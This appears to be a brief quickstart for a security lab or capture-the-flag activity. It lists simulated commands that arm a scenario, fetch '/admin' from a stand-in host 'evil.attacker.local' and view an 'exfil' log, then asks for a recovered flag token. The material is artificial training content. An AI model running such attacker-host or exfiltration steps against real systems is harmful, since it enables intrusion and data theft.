# Activity 2 Quickstart

```bash
cd /home/labDirectory
labfctl arm 3
fetch-sim evil.attacker.local /admin
fetch-sim evil.attacker.local /admin
fetch-sim evil.attacker.local /admin
labfctl logs exfil
```

Browser UI: `http://127.0.0.1:8080`

Submit only the recovered token in `SUBMIT_FLAG.txt`.
